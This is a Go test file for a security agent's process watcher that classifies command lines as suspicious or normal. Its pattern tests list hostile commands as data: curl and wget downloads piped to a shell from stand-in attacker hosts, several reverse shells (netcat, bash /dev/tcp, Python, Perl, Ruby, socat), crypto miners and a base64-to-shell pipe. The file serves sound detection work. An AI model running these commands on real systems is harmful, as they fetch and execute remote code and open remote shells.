package watcher

import (
	"context"
	"testing"
	"time"

	"github.com/Tesseract-Systems-Corporation/rampart-agent/pkg/event"
)

func TestProcessWatcherInterface(t *testing.T) {
	var _ Watcher = (*ProcessWatcher)(nil)
}

func TestProcessWatcherName(t *testing.T) {
	w := NewProcessWatcher(ProcessConfig{
		PollInterval: 5 * time.Second,
		FortressID:   "fort_test",
		ServerID:     "srv_test",
	})
	if w.Name() != "process" {
		t.Errorf("Name() = %v, want process", w.Name())
	}
}

func TestProcessWatcherConfig(t *testing.T) {
	tests := []struct {
		name         string
		config       ProcessConfig
		wantInterval time.Duration
	}{
		{
			name: "default interval",
			config: ProcessConfig{
				FortressID: "fort_test",
				ServerID:   "srv_test",
			},
			wantInterval: 5 * time.Second,
		},
		{
			name: "custom interval",
			config: ProcessConfig{
				PollInterval: 10 * time.Second,
				FortressID:   "fort_test",
				ServerID:     "srv_test",
			},
			wantInterval: 10 * time.Second,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w := NewProcessWatcher(tt.config)
			if w.pollInterval != tt.wantInterval {
				t.Errorf("pollInterval = %v, want %v", w.pollInterval, tt.wantInterval)
			}
		})
	}
}

func TestProcessWatcherPatterns(t *testing.T) {
	tests := []struct {
		name       string
		cmdline    string
		suspicious bool
	}{
		// Suspicious commands
		{
			name:       "curl pipe to sh",
			cmdline:    "curl https://evil.com/script.sh | sh",
			suspicious: true,
		},
		{
			name:       "curl pipe to bash",
			cmdline:    "curl -s https://attacker.com/payload | bash",
			suspicious: true,
		},
		{
			name:       "wget pipe to sh",
			cmdline:    "wget -qO- https://evil.com/script.sh | sh",
			suspicious: true,
		},
		{
			name:       "netcat reverse shell",
			cmdline:    "nc -e /bin/bash attacker.com 4444",
			suspicious: true,
		},
		{
			name:       "bash interactive",
			cmdline:    "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
			suspicious: true,
		},
		{
			name:       "script in tmp directory sh",
			cmdline:    "/tmp/malware.sh",
			suspicious: true,
		},
		{
			name:       "script in tmp directory py",
			cmdline:    "python3 /tmp/backdoor.py",
			suspicious: true,
		},
		{
			name:       "script in tmp directory pl",
			cmdline:    "perl /tmp/evil.pl",
			suspicious: true,
		},
		{
			name:       "xmrig crypto miner",
			cmdline:    "/opt/xmrig --donate-level 1 -o pool.mining.com:3333",
			suspicious: true,
		},
		{
			name:       "minerd crypto miner",
			cmdline:    "minerd -a cryptonight -o stratum+tcp://pool:3333",
			suspicious: true,
		},
		{
			name:       "cryptonight in command",
			cmdline:    "./miner --algo cryptonight",
			suspicious: true,
		},
		{
			name:       "base64 decode to shell",
			cmdline:    "echo 'bWFsd2FyZQ==' | base64 -d | sh",
			suspicious: true,
		},
		{
			name:       "python reverse shell",
			cmdline:    "python -c 'import socket,subprocess,os;s=socket.socket()'",
			suspicious: true,
		},
		{
			name:       "perl reverse shell",
			cmdline:    "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'",
			suspicious: true,
		},
		{
			name:       "ruby reverse shell",
			cmdline:    "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444)'",
			suspicious: true,
		},
		{
			name:       "netcat listener",
			cmdline:    "nc -l -p 4444",
			suspicious: true,
		},
		{
			name:       "ncat with exec",
			cmdline:    "ncat --exec /bin/bash -l 4444",
			suspicious: true,
		},
		{
			name:       "socat exec",
			cmdline:    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
			suspicious: true,
		},
		// Normal commands that should NOT be flagged
		{
			name:       "normal curl",
			cmdline:    "curl https://api.example.com/health",
			suspicious: false,
		},
		{
			name:       "normal wget",
			cmdline:    "wget https://releases.example.com/package.tar.gz",
			suspicious: false,
		},
		{
			name:       "normal bash script",
			cmdline:    "/usr/local/bin/deploy.sh",
			suspicious: false,
		},
		{
			name:       "normal python",
			cmdline:    "python3 /opt/app/main.py",
			suspicious: false,
		},
		{
			name:       "normal netcat client",
			cmdline:    "nc database.local 5432",
			suspicious: false,
		},
		{
			name:       "nginx process",
			cmdline:    "nginx: worker process",
			suspicious: false,
		},
		{
			name:       "postgres process",
			cmdline:    "postgres: background writer",
			suspicious: false,
		},
		{
			name:       "systemd service",
			cmdline:    "/lib/systemd/systemd-journald",
			suspicious: false,
		},
		{
			name:       "docker container",
			cmdline:    "containerd-shim -namespace moby -id abc123",
			suspicious: false,
		},
		{
			name:       "ssh daemon",
			cmdline:    "sshd: root@pts/0",
			suspicious: false,
		},
	}

	w := NewProcessWatcher(ProcessConfig{
		FortressID: "fort_test",
		ServerID:   "srv_test",
	})

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isSuspicious, _ := w.IsSuspiciousCommand(tt.cmdline)
			if isSuspicious != tt.suspicious {
				t.Errorf("IsSuspiciousCommand(%q) = %v, want %v", tt.cmdline, isSuspicious, tt.suspicious)
			}
		})
	}
}

func TestProcessWatcherCustomPatterns(t *testing.T) {
	customPatterns := []string{
		`custom-malware`,
		`evil-command`,
	}

	w := NewProcessWatcher(ProcessConfig{
		SuspiciousPatterns: customPatterns,
		FortressID:         "fort_test",
		ServerID:           "srv_test",
	})

	tests := []struct {
		cmdline    string
		suspicious bool
	}{
		{
			cmdline:    "custom-malware --payload",
			suspicious: true,
		},
		{
			cmdline:    "evil-command -x",
			suspicious: true,
		},
		{
			cmdline:    "curl https://evil.com | sh", // Default pattern not included
			suspicious: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.cmdline, func(t *testing.T) {
			isSuspicious, _ := w.IsSuspiciousCommand(tt.cmdline)
			if isSuspicious != tt.suspicious {
				t.Errorf("IsSuspiciousCommand(%q) = %v, want %v", tt.cmdline, isSuspicious, tt.suspicious)
			}
		})
	}
}

func TestProcessWatcherWatchUsers(t *testing.T) {
	w := NewProcessWatcher(ProcessConfig{
		WatchUsers: []string{"admin", "deploy"},
		FortressID: "fort_test",
		ServerID:   "srv_test",
	})

	if !w.watchUsers["admin"] {
		t.Error("expected admin to be in watchUsers")
	}
	if !w.watchUsers["deploy"] {
		t.Error("expected deploy to be in watchUsers")
	}
	if w.watchUsers["root"] {
		t.Error("expected root to NOT be in watchUsers")
	}
}

func TestParsePSLine(t *testing.T) {
	tests := []struct {
		name     string
		line     string
		wantPID  int
		wantPPID int
		wantUID  int
		wantUser string
		wantCmd  string
		wantNil  bool
	}{
		{
			name:     "normal process",
			line:     "  1234   1000    500 deploy   /usr/bin/python3 /app/server.py",
			wantPID:  1234,
			wantPPID: 1000,
			wantUID:  500,
			wantUser: "deploy",
			wantCmd:  "/usr/bin/python3 /app/server.py",
		},
		{
			name:     "root process",
			line:     "     1      0      0 root     /sbin/init",
			wantPID:  1,
			wantPPID: 0,
			wantUID:  0,
			wantUser: "root",
			wantCmd:  "/sbin/init",
		},
		{
			name:     "process with spaces in command",
			line:     " 12345  12340   1000 user     /opt/my app/run.sh --config /etc/my app/config.yml",
			wantPID:  12345,
			wantPPID: 12340,
			wantUID:  1000,
			wantUser: "user",
			wantCmd:  "/opt/my app/run.sh --config /etc/my app/config.yml",
		},
		{
			name:    "empty line",
			line:    "",
			wantNil: true,
		},
		{
			name:    "header line",
			line:    "  PID  PPID   UID USER     COMMAND",
			wantNil: true,
		},
		{
			name:    "invalid pid",
			line:    "  abc   1000    500 user   command",
			wantNil: true,
		},
		{
			name:    "too few fields",
			line:    "1234 1000",
			wantNil: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := parsePSLine(tt.line)

			if tt.wantNil {
				if result != nil {
					t.Errorf("expected nil, got %+v", result)
				}
				return
			}

			if result == nil {
				t.Fatal("expected result, got nil")
			}

			if result.PID != tt.wantPID {
				t.Errorf("PID = %v, want %v", result.PID, tt.wantPID)
			}
			if result.PPID != tt.wantPPID {
				t.Errorf("PPID = %v, want %v", result.PPID, tt.wantPPID)
			}
			if result.UID != tt.wantUID {
				t.Errorf("UID = %v, want %v", result.UID, tt.wantUID)
			}
			if result.Username != tt.wantUser {
				t.Errorf("Username = %v, want %v", result.Username, tt.wantUser)
			}
			if result.CommandLine != tt.wantCmd {
				t.Errorf("CommandLine = %v, want %v", result.CommandLine, tt.wantCmd)
			}
		})
	}
}

func TestParsePPIDFromStat(t *testing.T) {
	// /proc/[pid]/stat format: pid (comm) state ppid pgrp session tty_nr tpgid ...
	// The PPID is the 4th field (after pid, comm, state)
	tests := []struct {
		name     string
		stat     string
		wantPPID int
	}{
		{
			name:     "normal stat",
			stat:     "1234 (bash) S 1000 1234 1234 0 -1",
			wantPPID: 1000, // ppid is 1000, pgrp is 1234
		},
		{
			name:     "process with parens in name",
			stat:     "5678 (my (app)) S 5000 5678 5678 0 -1",
			wantPPID: 5000, // ppid is 5000
		},
		{
			name:     "init process",
			stat:     "1 (systemd) S 0 1 1 0 -1",
			wantPPID: 0, // init's ppid is 0
		},
		{
			name:     "invalid stat",
			stat:     "invalid",
			wantPPID: 0,
		},
		{
			name:     "empty stat",
			stat:     "",
			wantPPID: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := parsePPIDFromStat(tt.stat)
			if result != tt.wantPPID {
				t.Errorf("parsePPIDFromStat(%q) = %v, want %v", tt.stat, result, tt.wantPPID)
			}
		})
	}
}

func TestParseUIDFromStatus(t *testing.T) {
	tests := []struct {
		name     string
		status   string
		wantUID  int
		wantName string
	}{
		{
			name: "normal status",
			status: `Name:	bash
Umask:	0022
State:	S (sleeping)
Tgid:	1234
Ngid:	0
Pid:	1234
PPid:	1000
Uid:	1000	1000	1000	1000
Gid:	1000	1000	1000	1000`,
			wantUID:  1000,
			wantName: "bash",
		},
		{
			name: "root process",
			status: `Name:	init
Uid:	0	0	0	0
Gid:	0	0	0	0`,
			wantUID:  0,
			wantName: "init",
		},
		{
			name:     "empty status",
			status:   "",
			wantUID:  0,
			wantName: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			uid, name := parseUIDFromStatus(tt.status)
			if uid != tt.wantUID {
				t.Errorf("uid = %v, want %v", uid, tt.wantUID)
			}
			if name != tt.wantName {
				t.Errorf("name = %v, want %v", name, tt.wantName)
			}
		})
	}
}

func TestProcessWatcherContextCancellation(t *testing.T) {
	w := NewProcessWatcher(ProcessConfig{
		PollInterval: 1 * time.Hour, // Long interval
		FortressID:   "fort_test",
		ServerID:     "srv_test",
	})

	ctx, cancel := context.WithCancel(context.Background())

	ch, err := w.Watch(ctx)
	if err != nil {
		t.Fatalf("Watch() error = %v", err)
	}

	// Cancel immediately
	cancel()

	// Channel should close
	select {
	case _, ok := <-ch:
		if ok {
			for range ch {
			}
		}
	case <-time.After(500 * time.Millisecond):
		t.Error("channel did not close after context cancellation")
	}
}

func TestCreateProcessEvent(t *testing.T) {
	proc := ProcessInfo{
		PID:         1234,
		PPID:        1000,
		UID:         500,
		Username:    "deploy",
		Executable:  "/usr/bin/python3",
		CommandLine: "python3 /tmp/evil.py",
		WorkingDir:  "/tmp",
	}

	e := createProcessEvent(proc, "matched pattern: /tmp/.*\\.py", "fort_test", "srv_test")

	if e.Type != event.ProcessSuspicious {
		t.Errorf("Type = %v, want %v", e.Type, event.ProcessSuspicious)
	}

	if e.FortressID != "fort_test" {
		t.Errorf("FortressID = %v, want fort_test", e.FortressID)
	}

	if e.ServerID != "srv_test" {
		t.Errorf("ServerID = %v, want srv_test", e.ServerID)
	}

	payload := e.Payload
	if payload["pid"] != 1234 {
		t.Errorf("pid = %v, want 1234", payload["pid"])
	}
	if payload["ppid"] != 1000 {
		t.Errorf("ppid = %v, want 1000", payload["ppid"])
	}
	if payload["uid"] != 500 {
		t.Errorf("uid = %v, want 500", payload["uid"])
	}
	if payload["username"] != "deploy" {
		t.Errorf("username = %v, want deploy", payload["username"])
	}
	if payload["executable"] != "/usr/bin/python3" {
		t.Errorf("executable = %v, want /usr/bin/python3", payload["executable"])
	}
	if payload["command_line"] != "python3 /tmp/evil.py" {
		t.Errorf("command_line = %v, want python3 /tmp/evil.py", payload["command_line"])
	}
	if payload["working_dir"] != "/tmp" {
		t.Errorf("working_dir = %v, want /tmp", payload["working_dir"])
	}
	if payload["suspicious"] != true {
		t.Errorf("suspicious = %v, want true", payload["suspicious"])
	}
	if payload["suspicion_reason"] != "matched pattern: /tmp/.*\\.py" {
		t.Errorf("suspicion_reason = %v, want matched pattern: /tmp/.*\\.py", payload["suspicion_reason"])
	}

	// Check actor
	if e.Actor == nil {
		t.Fatal("Actor is nil")
	}
	if e.Actor.Type != event.ActorTypeUser {
		t.Errorf("Actor.Type = %v, want %v", e.Actor.Type, event.ActorTypeUser)
	}
	if e.Actor.Name != "deploy" {
		t.Errorf("Actor.Name = %v, want deploy", e.Actor.Name)
	}
}

func TestProcessWatcherCheckSuspicious(t *testing.T) {
	w := NewProcessWatcher(ProcessConfig{
		FortressID: "fort_test",
		ServerID:   "srv_test",
	})

	tests := []struct {
		name       string
		proc       ProcessInfo
		wantReason string
	}{
		{
			name: "suspicious curl pipe",
			proc: ProcessInfo{
				PID:         1234,
				CommandLine: "curl https://evil.com | sh",
			},
			wantReason: "matched pattern: curl.*\\|.*sh",
		},
		{
			name: "normal process",
			proc: ProcessInfo{
				PID:         5678,
				CommandLine: "nginx: worker process",
			},
			wantReason: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason := w.checkSuspicious(tt.proc)
			if reason != tt.wantReason {
				t.Errorf("checkSuspicious() = %q, want %q", reason, tt.wantReason)
			}
		})
	}
}

func TestDefaultSuspiciousPatterns(t *testing.T) {
	// Ensure all default patterns compile correctly
	w := NewProcessWatcher(ProcessConfig{
		FortressID: "fort_test",
		ServerID:   "srv_test",
	})

	if len(w.patterns) == 0 {
		t.Error("expected default patterns to be loaded")
	}

	// The number of patterns should match defaultSuspiciousPatterns
	if len(w.patterns) != len(defaultSuspiciousPatterns) {
		t.Errorf("patterns count = %d, want %d", len(w.patterns), len(defaultSuspiciousPatterns))
	}
}

func TestProcessWatcherInvalidPatternHandling(t *testing.T) {
	// Test that invalid regex patterns are handled gracefully
	w := NewProcessWatcher(ProcessConfig{
		SuspiciousPatterns: []string{
			`valid-pattern`,
			`[invalid`,  // Invalid regex
			`also-valid`,
		},
		FortressID: "fort_test",
		ServerID:   "srv_test",
	})

	// Should have compiled 2 valid patterns
	if len(w.patterns) != 2 {
		t.Errorf("patterns count = %d, want 2 (invalid pattern should be skipped)", len(w.patterns))
	}
}
